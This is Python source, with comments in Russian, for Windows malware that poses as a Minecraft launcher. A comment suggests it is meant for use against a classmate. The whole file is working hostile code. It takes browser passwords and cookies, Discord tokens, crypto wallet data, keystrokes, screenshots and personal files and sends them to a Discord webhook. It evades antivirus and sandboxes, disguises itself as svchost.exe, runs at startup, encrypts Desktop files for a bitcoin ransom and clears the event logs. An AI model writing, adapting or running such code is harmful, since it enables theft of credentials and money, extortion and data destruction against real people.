import subprocess
import os
import shutil
import sqlite3
import win32crypt
import json
import base64
import requests
import getpass
import platform
import psutil
import time
import threading
import random
from datetime import datetime
import logging
from pathlib import Path
from cryptography.fernet import Fernet
import pyautogui
import keyboard
import winreg
import glob
import string

# Настройки
MINECRAFT_PATH = "C:\\Program Files (x86)\\Minecraft Launcher\\MinecraftLauncher.exe"
DISCORD_WEBHOOK_URL = "YOUR_WEBHOOK_URL"  # Замени на URL вебхука от одноклассника
LOG_DIR = "logs"
LOG_FILE = os.path.join(LOG_DIR, f"stealer_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
TEMP_DIR = "temp_stealer_data"
ENCRYPTION_KEY = Fernet.generate_key()
CIPHER = Fernet(ENCRYPTION_KEY)

# Настройка логирования
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Антианализ: проверка антивирусов
def check_antivirus():
    av_processes = ["avp.exe", "msmpeng.exe", "norton.exe", "mcafee.exe", "avg.exe"]
    for process in psutil.process_iter(['name']):
        if process.info['name'].lower() in av_processes:
            logging.warning("Обнаружен антивирус, завершаю работу!")
            return True
    return False

# Антидетект: проверка на виртуальную машину
def is_vm():
    suspicious_processes = ["vboxservice.exe", "vmtoolsd.exe", "qemu-ga.exe"]
    for process in psutil.process_iter(['name']):
        if process.info['name'].lower() in suspicious_processes:
            logging.warning("Обнаружена виртуальная машина, завершаю работу!")
            return True
    if psutil.cpu_count() <= 2:
        logging.warning("Слишком мало ядер процессора, возможно ВМ!")
        return True
    return False

# Полиморфизм: изменяем код скрипта
def polymorph_script():
    try:
        with open(__file__, "r", encoding="utf-8") as f:
            code = f.readlines()
        for i, line in enumerate(code):
            if "TEMP_DIR" in line:
                new_name = ''.join(random.choices(string.ascii_letters, k=10))
                code[i] = line.replace("TEMP_DIR", new_name)
        new_file = f"launcher_{random.randint(1000, 9999)}.py"
        with open(new_file, "w", encoding="utf-8") as f:
            f.writelines(code)
        subprocess.Popen(["python", new_file], creationflags=subprocess.DETACHED_PROCESS)
        logging.info("Скрипт полиморфно изменён")
        os._exit(0)
    except Exception as e:
        logging.error(f"Ошибка полиморфизма: {str(e)}")

# Маскировка: переименовываем процесс
def mask_process():
    try:
        fake_path = os.path.join(os.environ["TEMP"], "svchost.exe")
        shutil.copyfile(__file__, fake_path)
        subprocess.Popen(fake_path, creationflags=subprocess.DETACHED_PROCESS)
        logging.info("Процесс замаскирован под svchost.exe")
    except Exception as e:
        logging.error(f"Ошибка маскировки: {str(e)}")

# Спам-процессы для отвлечения
def spam_processes():
    for _ in range(5):
        subprocess.Popen("notepad.exe", creationflags=subprocess.DETACHED_PROCESS)
        time.sleep(0.1)
    logging.info("Запущены отвлекающие процессы")

# Автозапуск
def add_to_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, f"\"{os.path.abspath(__file__)}\"")
        winreg.CloseKey(key)
        logging.info("Добавлен в автозапуск")
    except Exception as e:
        logging.error(f"Ошибка автозапуска: {str(e)}")

# Функция для шифрования данных
def encrypt_data(data):
    return CIPHER.encrypt(data.encode()).decode()

# Функция для отправки данных в Discord
def send_to_discord(title, description, color=0xFF0000, file_path=None):
    data = {
        "embeds": [{
            "title": title,
            "description": description,
            "color": color
        }]
    }
    if file_path:
        files = {"file": open(file_path, "rb")}
        requests.post(DISCORD_WEBHOOK_URL, data={"payload_json": json.dumps(data)}, files=files)
    else:
        requests.post(DISCORD_WEBHOOK_URL, json=data)

# Функция для получения команд из Discord
def check_discord_commands():
    # Простая реализация: нужно вручную отправлять команды в канал
    # Для автоматизации можно использовать Discord Bot API
    pass

# Функция для шифрования файлов жертвы (рансомвар)
def encrypt_files():
    desktop_path = os.path.join(os.environ["USERPROFILE"], "Desktop")
    for root, _, files in os.walk(desktop_path):
        for file in files:
            if file.endswith((".txt", ".doc", ".png")):
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, "rb") as f:
                        data = f.read()
                    encrypted_data = CIPHER.encrypt(data)
                    with open(file_path, "wb") as f:
                        f.write(encrypted_data)
                    logging.info(f"Зашифрован файл: {file_path}")
                except:
                    pass
    with open(os.path.join(desktop_path, "README.txt"), "w") as f:
        f.write("Ваши файлы зашифрованы! Отправьте 0.1 BTC для расшифровки.")

# Функция для уничтожения следов
def clear_traces():
    try:
        subprocess.run("wevtutil cl System", shell=True)
        subprocess.run("wevtutil cl Application", shell=True)
        logging.info("Системные логи очищены")
    except:
        pass

# Функция для сбора системной информации
def get_system_info():
    info = f"👤 Username: {getpass.getuser()}\n"
    info += f"💻 System: {platform.system()} {platform.release()}\n"
    info += f"🖥️ Processor: {platform.processor()}\n"
    info += f"🧠 RAM: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB"
    logging.info("Собрана системная информация")
    return info

# Функция для кражи паролей из Chrome
def steal_chrome_passwords():
    try:
        chrome_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
        temp_db = os.path.join(TEMP_DIR, "LoginData")
        if not os.path.exists(TEMP_DIR):
            os.makedirs(TEMP_DIR)
        shutil.copyfile(chrome_path, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        passwords = []
        for row in cursor.fetchall():
            url, username, encrypted_password = row
            if not username or not encrypted_password:
                continue
            password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
            passwords.append(f"🌐 URL: {url}\n👤 Username: {username}\n🔑 Password: {password}\n---")
        
        conn.close()
        os.remove(temp_db)
        logging.info(f"Украдено {len(passwords)} паролей из Chrome")
        return "\n".join(passwords) if passwords else "Пароли не найдены"
    except Exception as e:
        logging.error(f"Ошибка при краже паролей: {str(e)}")
        return f"Ошибка при краже паролей: {str(e)}"

# Функция для кражи паролей из Firefox
def steal_firefox_passwords():
    try:
        firefox_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
        profile = [d for d in os.listdir(firefox_path) if d.endswith(".default-release")][0]
        logins_path = os.path.join(firefox_path, profile, "logins.json")
        
        with open(logins_path, "r") as f:
            data = json.load(f)
        
        passwords = []
        for login in data["logins"]:
            url = login["hostname"]
            username = login["encryptedUsername"]
            password = login["encryptedPassword"]
            passwords.append(f"🌐 URL: {url}\n👤 Username: {username}\n🔑 Password: {password}\n---")
        
        logging.info(f"Украдено {len(passwords)} паролей из Firefox")
        return "\n".join(passwords) if passwords else "Пароли Firefox не найдены"
    except Exception as e:
        logging.error(f"Ошибка при краже паролей Firefox: {str(e)}")
        return f"Ошибка: {str(e)}"

# Функция для кражи паролей из Edge
def steal_edge_passwords():
    try:
        edge_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
        temp_db = os.path.join(TEMP_DIR, "EdgeLoginData")
        shutil.copyfile(edge_path, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        passwords = []
        for row in cursor.fetchall():
            url, username, encrypted_password = row
            if not username or not encrypted_password:
                continue
            password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
            passwords.append(f"🌐 URL: {url}\n👤 Username: {username}\n🔑 Password: {password}\n---")
        
        conn.close()
        os.remove(temp_db)
        logging.info(f"Украдено {len(passwords)} паролей из Edge")
        return "\n".join(passwords) if passwords else "Пароли Edge не найдены"
    except Exception as e:
        logging.error(f"Ошибка при краже паролей Edge: {str(e)}")
        return f"Ошибка: {str(e)}"

# Функция для кражи cookies из Chrome
def steal_chrome_cookies():
    try:
        cookies_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Cookies")
        temp_cookies = os.path.join(TEMP_DIR, "Cookies")
        shutil.copyfile(cookies_path, temp_cookies)

        conn = sqlite3.connect(temp_cookies)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        
        cookies = []
        for row in cursor.fetchall():
            host, name, encrypted_value = row
            if not encrypted_value:
                continue
            value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
            cookies.append(f"🌐 Host: {host}\n🍪 Name: {name}\n🔑 Value: {value}\n---")
        
        conn.close()
        os.remove(temp_cookies)
        logging.info(f"Украдено {len(cookies)} cookies из Chrome")
        return "\n".join(cookies) if cookies else "Cookies не найдены"
    except Exception as e:
        logging.error(f"Ошибка при краже cookies: {str(e)}")
        return f"Ошибка при краже cookies: {str(e)}"

# Функция для кражи токенов Discord
def steal_discord_tokens():
    try:
        discord_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "discord", "Local Storage", "leveldb")
        if not os.path.exists(discord_path):
            return "Discord не установлен"
        
        tokens = []
        for file_name in glob.glob(os.path.join(discord_path, "*.ldb")):
            with open(file_name, "r", errors="ignore") as file:
                content = file.read()
                if "token" in content:
                    for line in content.split():
                        if "token" in line:
                            token = line.split('"token":"')[1].split('"')[0]
                            tokens.append(token)
                            break
        
        logging.info(f"Украдено {len(tokens)} токенов Discord")
        return "\n".join([f"🎮 Token: {token}" for token in tokens]) if tokens else "Токены Discord не найдены"
    except Exception as e:
        logging.error(f"Ошибка при краже токенов Discord: {str(e)}")
        return f"Ошибка при краже токенов: {str(e)}"

# Функция для создания скриншота
def take_screenshot():
    screenshot_path = os.path.join(TEMP_DIR, f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
    pyautogui.screenshot().save(screenshot_path)
    logging.info("Скриншот сделан")
    return screenshot_path

# Функция для записи нажатий клавиш (keylogger)
def keylogger():
    log_file = os.path.join(TEMP_DIR, "keylog.txt")
    with open(log_file, "a") as f:
        def on_press(key):
            try:
                f.write(str(key) + "\n")
                f.flush()
            except:
                pass
        keyboard.on_press(on_press)
        time.sleep(120)  # Логируем 120 секунд
        keyboard.unhook_all()
    logging.info("Запись клавиш завершена")
    return log_file

# Функция для поиска и кражи файлов
def steal_files(extensions=[".txt", ".png", ".jpg", ".pdf", ".docx"]):
    desktop_path = os.path.join(os.environ["USERPROFILE"], "Desktop")
    documents_path = os.path.join(os.environ["USERPROFILE"], "Documents")
    downloads_path = os.path.join(os.environ["USERPROFILE"], "Downloads")
    paths = [desktop_path, documents_path, downloads_path]
    stolen_files = []
    for path in paths:
        for root, _, files in os.walk(path):
            for file in files:
                if any(file.endswith(ext) for ext in extensions):
                    file_path = os.path.join(root, file)
                    temp_path = os.path.join(TEMP_DIR, os.path.basename(file_path))
                    shutil.copyfile(file_path, temp_path)
                    stolen_files.append(temp_path)
    logging.info(f"Украдено {len(stolen_files)} файлов")
    return stolen_files

# Функция для кражи данных криптокошельков (MetaMask и Trust Wallet)
def steal_crypto_wallets():
    wallets = []
    try:
        # MetaMask
        metamask_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")
        if os.path.exists(metamask_path):
            temp_wallet = os.path.join(TEMP_DIR, "metamask_data.zip")
            shutil.make_archive(temp_wallet.replace(".zip", ""), "zip", metamask_path)
            wallets.append(temp_wallet)
            logging.info("Украдены данные MetaMask")

        # Trust Wallet
        trust_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "ibnejdfjmmkpcnlpebklmnkoeoihofec")
        if os.path.exists(trust_path):
            temp_trust = os.path.join(TEMP_DIR, "trustwallet_data.zip")
            shutil.make_archive(temp_trust.replace(".zip", ""), "zip", trust_path)
            wallets.append(temp_trust)
            logging.info("Украдены данные Trust Wallet")
        
        return wallets
    except Exception as e:
        logging.error(f"Ошибка при краже криптокошельков: {str(e)}")
        return []

# Функция для запуска Minecraft (маскировка)
def launch_minecraft():
    logging.info("Запускаю Minecraft для маскировки...")
    subprocess.Popen(MINECRAFT_PATH)
    time.sleep(10)

# Функция для проверки, запущен ли Minecraft
def is_minecraft_running():
    for process in psutil.process_iter(['name']):
        if 'javaw.exe' in process.info['name']:
            return True
    return False

# Основная функция
def main():
    # Проверка на антивирус и ВМ
    if check_antivirus() or is_vm():
        send_to_discord("🚨 Обнаружен антивирус или ВМ!", "Завершаю работу!", 0xFF0000)
        return

    # Полиморфизм, маскировка и автозапуск
    polymorph_script()
    mask_process()
    add_to_startup()
    spam_processes()

    # Запускаем Minecraft для маскировки
    launch_minecraft()
    while not is_minecraft_running():
        logging.info("Ожидаю запуск Minecraft...")
        time.sleep(2)

    # Собираем данные в параллельных потоках
    send_to_discord("🎯 Новый запуск стилера!", "Сбор данных начат!", 0x00FF00)
    
    threads = []
    
    # Системная информация
    def send_system_info():
        system_info = get_system_info()
        send_to_discord("💻 Системная информация", system_info, 0x00FF00)
    threads.append(threading.Thread(target=send_system_info))

    # Кража паролей из Chrome
    def send_chrome_passwords():
        passwords = steal_chrome_passwords()
        send_to_discord("🔑 Пароли из Chrome", passwords, 0xFF0000)
    threads.append(threading.Thread(target=send_chrome_passwords))

    # Кража паролей из Firefox
    def send_firefox_passwords():
        passwords = steal_firefox_passwords()
        send_to_discord("🦊 Пароли из Firefox", passwords, 0xFF4500)
    threads.append(threading.Thread(target=send_firefox_passwords))

    # Кража паролей из Edge
    def send_edge_passwords():
        passwords = steal_edge_passwords()
        send_to_discord("🌐 Пароли из Edge", passwords, 0x1E90FF)
    threads.append(threading.Thread(target=send_edge_passwords))

    # Кража cookies
    def send_cookies():
        cookies = steal_chrome_cookies()
        send_to_discord("🍪 Cookies из Chrome", cookies, 0xFFD700)
    threads.append(threading.Thread(target=send_cookies))

    # Кража токенов Discord
    def send_discord_tokens():
        tokens = steal_discord_tokens()
        send_to_discord("🎮 Токены Discord", tokens, 0x7289DA)
    threads.append(threading.Thread(target=send_discord_tokens))

    # Скриншот
    def send_screenshot():
        screenshot = take_screenshot()
        send_to_discord("🖼️ Скриншот экрана", "Скриншот отправлен!", 0x00CED1, file_path=screenshot)
    threads.append(threading.Thread(target=send_screenshot))

    # Keylogger
    def send_keylog():
        keylog_file = keylogger()
        send_to_discord("⌨️ Лог клавиш", "Лог отправлен!", 0xFF69B4, file_path=keylog_file)
    threads.append(threading.Thread(target=send_keylog))

    # Кража файлов
    def send_files():
        files = steal_files()
        for file in files:
            send_to_discord("📁 Найден файл!", f"Файл: {os.path.basename(file)}", 0x32CD32, file_path=file)
    threads.append(threading.Thread(target=send_files))

    # Кража криптокошельков
    def send_wallets():
        wallets = steal_crypto_wallets()
        for wallet in wallets:
            send_to_discord("💰 Найден криптокошелёк!", f"Кошелёк: {os.path.basename(wallet)}", 0xFFD700, file_path=wallet)
    threads.append(threading.Thread(target=send_wallets))

    # Запускаем все потоки
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

    # Очистка следов
    clear_traces()
    shutil.rmtree(TEMP_DIR, ignore_errors=True)
    logging.info("Следы очищены")

if __name__ == "__main__":
    main()
